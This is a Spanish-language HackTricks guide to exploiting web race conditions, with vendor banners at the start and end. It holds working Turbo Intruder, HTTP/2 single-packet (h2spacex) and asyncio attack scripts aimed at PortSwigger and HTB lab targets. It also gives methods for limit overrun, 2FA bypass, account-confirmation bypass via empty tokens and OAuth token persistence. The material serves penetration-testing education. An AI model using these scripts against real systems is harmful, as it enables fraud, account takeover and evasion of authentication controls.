# Condici√≥n de Carrera

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
¬°Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**productos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
Para obtener una comprensi√≥n profunda de esta t√©cnica, consulta el informe original en [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Mejorando los Ataques de Condici√≥n de Carrera

El principal desaf√≠o para aprovechar las condiciones de carrera es asegurarse de que m√∫ltiples solicitudes se manejen al mismo tiempo, con **muy poca diferencia en sus tiempos de procesamiento, idealmente, menos de 1ms**.

Aqu√≠ puedes encontrar algunas t√©cnicas para Sincronizar Solicitudes:

#### Ataque de un Solo Paquete HTTP/2 vs. Sincronizaci√≥n del √öltimo Byte de HTTP/1.1

* **HTTP/2**: Permite enviar dos solicitudes sobre una √∫nica conexi√≥n TCP, reduciendo el impacto del jitter de red. Sin embargo, debido a variaciones en el lado del servidor, dos solicitudes pueden no ser suficientes para un exploit de condici√≥n de carrera consistente.
* **HTTP/1.1 'Sincronizaci√≥n del √öltimo Byte'**: Permite el preenv√≠o de la mayor√≠a de las partes de 20-30 solicitudes, reteniendo un peque√±o fragmento, que luego se env√≠a juntos, logrando una llegada simult√°nea al servidor.

La **Preparaci√≥n para la Sincronizaci√≥n del √öltimo Byte** implica:

1. Enviar encabezados y datos del cuerpo menos el byte final sin finalizar el flujo.
2. Pausar durante 100ms despu√©s del env√≠o inicial.
3. Deshabilitar TCP\_NODELAY para utilizar el algoritmo de Nagle para agrupar los marcos finales.
4. Hacer ping para calentar la conexi√≥n.

El posterior env√≠o de marcos retenidos deber√≠a resultar en su llegada en un solo paquete, verificable a trav√©s de Wireshark. Este m√©todo no se aplica a archivos est√°ticos, que normalmente no est√°n involucrados en ataques de CC.

### Adapt√°ndose a la Arquitectura del Servidor

Comprender la arquitectura del objetivo es crucial. Los servidores front-end pueden enrutar las solicitudes de manera diferente, afectando el tiempo. El calentamiento preventivo de la conexi√≥n del lado del servidor, a trav√©s de solicitudes inconsecuentes, podr√≠a normalizar el tiempo de solicitud.

#### Manejo de Bloqueos Basados en Sesiones

Los frameworks como el manejador de sesiones de PHP serializan las solicitudes por sesi√≥n, lo que potencialmente oculta vulnerabilidades. Utilizar tokens de sesi√≥n diferentes para cada solicitud puede evitar este problema.

#### Superar L√≠mites de Tasa o Recursos

Si el calentamiento de la conexi√≥n no es efectivo, provocar intencionalmente retrasos en los l√≠mites de tasa o recursos de los servidores web a trav√©s de una inundaci√≥n de solicitudes ficticias podr√≠a facilitar el ataque de un solo paquete al inducir un retraso del lado del servidor propicio para las condiciones de carrera.

## Ejemplos de Ataque

* **Tubo Intruder - Ataque de un solo paquete HTTP2 (1 punto final)**: Puedes enviar la solicitud a **Turbo Intruder** (`Extensiones` -> `Turbo Intruder` -> `Enviar a Turbo Intruder`), puedes cambiar en la solicitud el valor que deseas probar por fuerza bruta para **`%s`** como en `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` y luego seleccionar el **`ejemplos/race-single-packer-attack.py`** del men√∫ desplegable:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si vas a **enviar valores diferentes**, podr√≠as modificar el c√≥digo con este que utiliza una lista de palabras del portapapeles:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Si la web no es compatible con HTTP2 (solo HTTP1.1), utiliza `Engine.THREADED` o `Engine.BURP` en lugar de `Engine.BURP2`.
{% endhint %}

* **Intruder Pipe - Ataque de un solo paquete HTTP2 (Varios endpoints)**: En caso de que necesites enviar una solicitud a 1 endpoint y luego m√∫ltiples a otros endpoints para desencadenar la RCE, puedes modificar el script `race-single-packet-attack.py` con algo como:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Tambi√©n est√° disponible en **Repeater** a trav√©s de la nueva opci√≥n '**Enviar grupo en paralelo**' en Burp Suite.
* Para **limit-overrun** simplemente podr√≠as agregar la **misma solicitud 50 veces** en el grupo.
* Para el **calentamiento de la conexi√≥n**, podr√≠as **agregar** al **principio** del **grupo** algunas **solicitudes** a alguna parte no est√°tica del servidor web.
* Para **retrasar** el proceso **entre** el procesamiento **de una solicitud y otra** en 2 pasos de subestados, podr√≠as **agregar solicitudes adicionales entre** ambas solicitudes.
* Para un RC de **m√∫ltiples puntos finales**, podr√≠as comenzar enviando la **solicitud** que **va al estado oculto** y luego **50 solicitudes** justo despu√©s que **explotan el estado oculto**.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* **Script automatizado en Python**: El objetivo de este script es cambiar el correo electr√≥nico de un usuario mientras se verifica continuamente hasta que el token de verificaci√≥n del nuevo correo electr√≥nico llegue al √∫ltimo correo electr√≥nico (esto se debe a que en el c√≥digo se ve√≠a un RC donde era posible modificar un correo electr√≥nico pero tener la verificaci√≥n enviada al antiguo porque la variable que indicaba el correo electr√≥nico ya estaba poblada con el primero).\
Cuando se encuentra la palabra "objetivo" en los correos electr√≥nicos recibidos, sabemos que recibimos el token de verificaci√≥n del correo electr√≥nico cambiado y finalizamos el ataque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)




# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Fuerza Bruta en Bruto

Antes de la investigaci√≥n anterior, estos eran algunos payloads utilizados que simplemente intentaban enviar los paquetes lo m√°s r√°pido posible para causar una RC.

* **Repetidor:** Consulta los ejemplos de la secci√≥n anterior.
* **Intruso:** Env√≠a la **solicitud** a **Intruso**, establece el **n√∫mero de hilos** en **30** dentro del men√∫ de **Opciones** y selecciona como payload **Cargas nulas** y genera **30.**
* **Intruso Turbo**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## Metodolog√≠a de RC

### L√≠mite de sobrepaso / TOCTOU

Este es el tipo m√°s b√°sico de condici√≥n de carrera donde **vulnerabilidades** que **aparecen** en lugares que **limitan la cantidad de veces que puedes realizar una acci√≥n**. Como usar el mismo c√≥digo de descuento varias veces en una tienda web. Un ejemplo muy f√°cil se puede encontrar en [**este informe**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) o en [**este bug**](https://hackerone.com/reports/759247)**.**

Existen muchas variaciones de este tipo de ataque, incluyendo:

- Canjear una tarjeta de regalo varias veces
- Calificar un producto varias veces
- Retirar o transferir efectivo en exceso de tu saldo de cuenta
- Reutilizar una soluci√≥n CAPTCHA √∫nica
- Saltarse un l√≠mite de velocidad anti-fuerza bruta

### **Subestados ocultos**

Explotar condiciones de carrera complejas a menudo implica aprovechar oportunidades breves para interactuar con subestados de m√°quina ocultos o **no intencionales**. As√≠ es como se aborda esto:

1. **Identificar posibles subestados ocultos**
   - Comienza por se√±alar los puntos finales que modifican o interact√∫an con datos cr√≠ticos, como perfiles de usuario o procesos de restablecimiento de contrase√±a. Enf√≥cate en:
     - **Almacenamiento**: Prefiere los puntos finales que manipulan datos persistentes en el servidor sobre aquellos que manejan datos en el lado del cliente.
     - **Acci√≥n**: Busca operaciones que alteren datos existentes, las cuales son m√°s propensas a crear condiciones explotables en comparaci√≥n con aquellas que agregan nuevos datos.
     - **Clave**: Los ataques exitosos generalmente involucran operaciones clave en el mismo identificador, por ejemplo, nombre de usuario o token de restablecimiento.
2. **Realizar sondas iniciales**
   - Prueba los puntos finales identificados con ataques de condici√≥n de carrera, observando cualquier desviaci√≥n de los resultados esperados. Respuestas inesperadas o cambios en el comportamiento de la aplicaci√≥n pueden indicar una vulnerabilidad.
3. **Demostrar la vulnerabilidad**
   - Reduce el ataque al n√∫mero m√≠nimo de solicitudes necesarias para explotar la vulnerabilidad, a menudo solo dos. Este paso puede requerir m√∫ltiples intentos o automatizaci√≥n debido al tiempo preciso involucrado.

### Ataques sensibles al tiempo

La precisi√≥n en el tiempo de las solicitudes puede revelar vulnerabilidades, especialmente cuando se utilizan m√©todos predecibles como marcas de tiempo para tokens de seguridad. Por ejemplo, generar tokens de restablecimiento de contrase√±a basados en marcas de tiempo podr√≠a permitir tokens id√©nticos para solicitudes simult√°neas.

**Para explotar:**

- Utiliza un tiempo preciso, como un ataque de paquete √∫nico, para realizar solicitudes de restablecimiento de contrase√±a concurrentes. Los tokens id√©nticos indican una vulnerabilidad.

**Ejemplo:**

- Solicita dos tokens de restablecimiento de contrase√±a al mismo tiempo y comp√°ralos. Los tokens coincidentes sugieren un fallo en la generaci√≥n de tokens.

**Consulta este** [**Laboratorio de PortSwigger**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **para probar esto.**

## Estudios de casos de subestados ocultos

### Pagar y agregar un art√≠culo

Consulta este [**Laboratorio de PortSwigger**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) para ver c√≥mo **pagar** en una tienda y **agregar un art√≠culo adicional** que **no necesitar√°s pagar**.

### Confirmar otros correos electr√≥nicos

La idea es **verificar una direcci√≥n de correo electr√≥nico y cambiarla a otra al mismo tiempo** para averiguar si la plataforma verifica la nueva direcci√≥n cambiada.

### Cambiar correo electr√≥nico a 2 direcciones de correo electr√≥nico basadas en cookies

Seg√∫n [**esta investigaci√≥n**](https://portswigger.net/research/smashing-the-state-machine) Gitlab era vulnerable a una toma de control de esta manera porque podr√≠a **enviar** el **token de verificaci√≥n de correo electr√≥nico de un correo electr√≥nico al otro correo electr√≥nico**.

**Consulta este** [**Laboratorio de PortSwigger**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **para probar esto.**

### Estados de base de datos ocultos / Bypass de confirmaci√≥n

Si se utilizan **2 escrituras diferentes** para **agregar informaci√≥n** dentro de una **base de datos**, hay un peque√±o per√≠odo de tiempo donde **solo se ha escrito el primer dato** dentro de la base de datos. Por ejemplo, al crear un usuario, el **nombre de usuario** y la **contrase√±a** podr√≠an ser **escritos** y luego el **token** para confirmar la cuenta reci√©n creada se escribe. Esto significa que por un corto tiempo el **token para confirmar una cuenta es nulo**.

Por lo tanto, **registrarse en una cuenta y enviar varias solicitudes con un token vac√≠o** (`token=` o `token[]=` u otra variaci√≥n) para confirmar la cuenta de inmediato podr√≠a permitir **confirmar una cuenta** donde no controlas el correo electr√≥nico.

**Consulta este** [**Laboratorio de PortSwigger**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **para probar esto.**

### Bypass de 2FA

El siguiente pseudo-c√≥digo es vulnerable a una condici√≥n de carrera porque en un tiempo muy corto el **2FA no se aplica** mientras se crea la sesi√≥n:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### Persistencia eterna de OAuth2

Hay varios [**proveedores de OAuth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Estos servicios te permitir√°n crear una aplicaci√≥n y autenticar a los usuarios que el proveedor haya registrado. Para hacerlo, el **cliente** necesitar√° **permitir que tu aplicaci√≥n** acceda a algunos de sus datos dentro del **proveedor de OAuth**.\
Entonces, hasta aqu√≠ solo un inicio de sesi√≥n com√∫n con google/linkedin/github... donde se te muestra una p√°gina que dice: "_La aplicaci√≥n \<InsertCoolName> quiere acceder a tu informaci√≥n, ¬ødeseas permitirlo?_"

#### Condici√≥n de Carrera en `authorization_code`

El **problema** surge cuando **lo aceptas** y autom√°ticamente env√≠a un **`authorization_code`** a la aplicaci√≥n maliciosa. Luego, esta **aplicaci√≥n abusa de una Condici√≥n de Carrera en el proveedor de servicios de OAuth para generar m√°s de un AT/RT** (_Authentication Token/Refresh Token_) a partir del **`authorization_code`** para tu cuenta. B√°sicamente, abusar√° del hecho de que has aceptado que la aplicaci√≥n acceda a tus datos para **crear varias cuentas**. Entonces, si **dejas de permitir que la aplicaci√≥n acceda a tus datos, un par de AT/RT se eliminar√°, pero los otros seguir√°n siendo v√°lidos**.

#### Condici√≥n de Carrera en `Refresh Token`

Una vez que has **obtenido un RT v√°lido** podr√≠as intentar **abusar de √©l para generar varios AT/RT** y **incluso si el usuario cancela los permisos** para que la aplicaci√≥n maliciosa acceda a sus datos, **varios RT seguir√°n siendo v√°lidos**.

## **CC en WebSockets**

En [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) puedes encontrar un PoC en Java para enviar mensajes de websocket en **paralelo** y abusar de las **Condiciones de Carrera tambi√©n en Web Sockets**.

## Referencias

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
¬°Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
